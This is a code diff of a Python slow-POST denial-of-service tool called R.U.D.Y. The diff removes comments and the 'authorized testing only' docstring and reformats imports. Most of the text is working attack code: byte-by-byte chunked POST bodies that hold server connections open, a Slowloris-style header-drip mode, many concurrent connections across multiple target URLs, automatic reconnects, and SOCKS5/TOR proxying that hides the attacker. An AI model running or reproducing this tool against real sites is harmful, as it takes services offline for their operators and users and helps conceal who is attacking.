@@ -1,29 +1,20 @@
-#!/usr/bin/env python3
-"""
-R.U.D.Y. (R-U-Dead-Yet?) - Advanced Slow POST Attack Tool
-FOR AUTHORIZED TESTING ONLY.
-
-Features:
-  - Chunked Transfer-Encoding (byte drip)
-  - Multi-target URL list support
-  - Adaptive interval (backs off on 429/503)
-  - Header drip mode (Slowloris-style)
-  - Variable chunk sizes (--chunk-min / --chunk-max)
-  - Server response tracking in dashboard
-  - TOR / SOCKS5 proxy support
-  - File-based or random payload
-  - Human-readable payload sizes (1MB, 500KB, 1GB)
-  - Configurable interval between bytes (default: 10s)
-  - JSON log and summary report
-  - Colored terminal output
-"""
-
-import socket, ssl, time, argparse, random, sys, threading, string
-import signal, os, struct, re, json
+#OS: Linux based OS's, Windows, macOS
+import socket
+import ssl
+import time
+import argparse
+import random
+import sys
+import threading
+import string
+import signal
+import os
+import struct
+import re
+import json
 from urllib.parse import urlparse
-from datetime import datetime, timedelta
-
-# ========================= Colors =========================
+from datetime import datetime
+from datetime import timedelta
 
 class C:
     R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
@@ -33,8 +24,6 @@ class C:
     def off():
         for a in ['R','G','Y','B','M','CN','W','BOLD','DIM','RST']:
             setattr(C, a, "")
-
-# ========================= Logger =========================
 
 class Log:
     _lock = threading.Lock()
@@ -74,8 +63,6 @@ class Log:
         with open(path, "w", encoding="utf-8") as f:
             json.dump(cls._json_log, f, indent=2)
 
-# ========================= Utils =========================
-
 def parse_size(s):
     m = re.match(r'^(\d+(?:\.\d+)?)\s*(B|KB|MB|GB|TB)?$', s.strip().upper())
     if not m: raise ValueError(f"Invalid size: {s}")
@@ -99,15 +86,13 @@ UA_LIST = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
 ]
 
-# ========================= Stats =========================
-
 class Stats:
     def __init__(self):
         self._lk = threading.Lock()
         self.bytes = 0; self.conns = 0; self.active = 0
         self.fails = 0; self.recons = 0; self.reqs = 0
         self.t0 = time.time()
-        self.status_codes = {}  # track server responses
+        self.status_codes = {}
 
     def add_bytes(self, n):
         with self._lk: self.bytes += n
@@ -134,15 +119,11 @@ class Stats:
                         bps=self.bytes/e if e>0 else 0,
                         status_codes=dict(self.status_codes))
 
-# ========================= Chunked Encoding =========================
-
 def chunk_enc(data):
     return f"{len(data):x}\r\n".encode() + data + b"\r\n"
 
 def chunk_end():
     return b"0\r\n\r\n"
-
-# ========================= SOCKS5 =========================
 
 def socks5_connect(ph, pp, dh, dp):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -160,8 +141,6 @@ def socks5_connect(ph, pp, dh, dp):
         raise ConnectionError(f"SOCKS5 connect failed (code {resp[1]})")
     return sock
 
-# ========================= Proxy Parser =========================
-
 def parse_proxy(s):
     if not s: return None
     s = s.strip()
@@ -171,11 +150,8 @@ def parse_proxy(s):
     if s.startswith("http://"):
         h, p = s[len("http://"):].rsplit(":", 1)
         return ("http", h, int(p))
-    # No scheme = treat as HTTP proxy
     h, p = s.rsplit(":", 1)
     return ("http", h, int(p))
-
-# ========================= URL List Parser =========================
 
 def load_targets(url=None, url_file=None):
     """Load target URLs from CLI arg or file. Returns list of (host, port, path, ssl)."""
@@ -197,8 +173,6 @@ def load_targets(url=None, url_file=None):
             "url": u,
         })
     return targets
-
-# ========================= Connection =========================
 
 class RUDYConn:
     def __init__(self, cid, target, payload, interval, jitter,
@@ -241,7 +215,6 @@ class RUDYConn:
 
     def _build_headers(self):
         ua = random.choice(UA_LIST)
-        # Use a very large Content-Length — the server will wait forever for the body
         content_length = len(self.payload)
         hdr = (
             f"POST {self.path} HTTP/1.1\r\n"
@@ -285,14 +258,12 @@ class RUDYConn:
     def _drip_body(self):
         idx = 0; total = len(self.payload)
 
-        # Enable TCP keepalive so the OS keeps the connection alive
         try:
             self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         except OSError:
             pass
 
         while not self.stop.is_set():
-            # Send one small chunk
             if idx < total:
                 cs = random.randint(self.chunk_min, self.chunk_max)
                 cs = min(cs, total - idx)
@@ -308,21 +279,17 @@ class RUDYConn:
             delay = max(0.5, delay)
             end = time.time() + delay
 
-            # Wait for interval, but check every 0.5s if server closed the connection
             while time.time() < end and not self.stop.is_set():
                 time.sleep(0.5)
-                # Non-blocking peek: if server sent data (early response or RST), handle it
                 try:
                     self.sock.setblocking(False)
                     data = self.sock.recv(1)
                     self.sock.setblocking(True)
                     if data == b"":
-                        # Server closed connection (EOF)
                         return False
-                    # Server sent a response early (rare) — ignore bytes, keep dripping
                 except BlockingIOError:
                     self.sock.setblocking(True)
-                    pass  # No data yet, normal
+                    pass
                 except OSError:
                     self.sock.setblocking(True)
                     return False
@@ -335,13 +302,11 @@ class RUDYConn:
             self.sock.settimeout(5)
             resp = self.sock.recv(4096).decode(errors="ignore")
             if resp:
-                # Extract status code
                 m = re.match(r'HTTP/\d\.\d\s+(\d+)', resp)
                 if m:
                     code = int(m.group(1))
                     self.stats.add_status(code)
                     Log.info(f"[#{self.cid}] Response: {code}")
-                    # Adaptive interval
                     if self.adaptive and code in (429, 503):
                         self.interval = min(self.interval * 2, 60)
                         Log.warn(f"[#{self.cid}] {code} received, interval -> {self.interval:.1f}s")
@@ -362,7 +327,6 @@ class RUDYConn:
                 else:
                     Log.ok(f"[#{self.cid}] Connected {self.host}:{self.port}")
 
-                # Send headers (slowloris or normal)
                 if self.drip_headers:
                     Log.atk(f"[#{self.cid}] Slowloris mode: dripping headers...")
                     if not self._send_headers_slow():
@@ -374,13 +338,11 @@ class RUDYConn:
                 self.stats.req_sent()
                 Log.atk(f"[#{self.cid}] Holding connection | Body: {fmt_bytes(len(self.payload))} declared | 1 byte/{self.interval}s")
 
-                # Drip body forever — this call blocks until server closes or stop is set
                 self._drip_body()
 
-                # If we get here, server closed the connection — reconnect
                 if not self.stop.is_set():
                     Log.warn(f"[#{self.cid}] Server closed connection, reconnecting...")
-                    retries = 0  # reset retries on reconnect after natural close
+                    retries = 0
 
             except (ConnectionRefusedError, OSError) as e:
                 retries += 1; self.stats.conn_fail()
@@ -402,8 +364,6 @@ class RUDYConn:
 
         if retries >= max_retries:
             Log.err(f"[#{self.cid}] Max retries. Exiting.")
-
-# ========================= Dashboard =========================
 
 def dashboard(stats, stop, iv=5):
     first = True
@@ -434,8 +394,6 @@ def dashboard(stats, stop, iv=5):
             f"\033[K  {C.DIM}Press Ctrl+C to stop{C.RST}", end="", flush=True)
     print()
 
-# ========================= Banner =========================
-
 def banner():
     print(rf"""
 {C.R}{C.BOLD}
@@ -459,9 +417,13 @@ def banner():
   {C.DIM}   https://github.com/rafosw/rudy{C.RST}
 """)
 
-# ========================= Main =========================
-
 def main():
+    if sys.stdout.encoding.lower() != 'utf-8':
+        try:
+            sys.stdout.reconfigure(encoding='utf-8')
+        except AttributeError:
+            pass
+
     parser = argparse.ArgumentParser(
         description="R.U.D.Y. Advanced Slow POST Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
@@ -518,7 +480,6 @@ Examples:
 
     Log.init(args.log)
 
-    # Load targets
     targets = load_targets(url=args.url, url_file=args.url_file)
     if not targets:
         Log.err("No valid target URL provided. Use -u or --url-file.")
@@ -541,7 +502,6 @@ Examples:
         Log.info(f"Random payload: {fmt_bytes(len(payload))}")
 
     proxy = parse_proxy(args.tor or args.proxy)
-    # Jitter capped at 30% of interval
     jitter = max(0.0, min(args.interval * 0.3, args.jitter))
 
     Log.info(f"Targets    : {len(targets)} URL(s)")
@@ -574,9 +534,8 @@ Examples:
     dt = threading.Thread(target=dashboard, args=(stats, stop, args.stats_iv), daemon=True)
     dt.start()
 
-    Log.quiet = True  # Stop printing logs to screen to keep the dashboard stable
+    Log.quiet = True
 
-    # Launch threads, distributing across targets
     threads = []
     if not Log.quiet: Log.info(f"Launching {args.concurrents} connections...\n")
     for i in range(args.concurrents):
@@ -606,7 +565,6 @@ Examples:
     for t in threads:
         t.join(timeout=5)
 
-    # Summary
     s = stats.snap()
     el = str(timedelta(seconds=int(s["elapsed"])))
     sc = ", ".join(f"{k}:{v}" for k,v in sorted(s["status_codes"].items())) or "none"
@@ -623,7 +581,6 @@ Examples:
     print(f"  Responses     : {sc}")
     print(f"{C.BOLD}{C.R}{'='*55}{C.RST}\n")
 
-    # JSON report
     if args.report:
         report = {
             "timestamp": datetime.now().isoformat(),
@@ -648,7 +605,6 @@ Examples:
         }
         with open(args.report, "w") as f:
             json.dump(report, f, indent=2)
-        # Briefly enable logging to print the report saved message
         Log.quiet = False
         Log.info(f"Report saved: {args.report}")
         Log.quiet = True
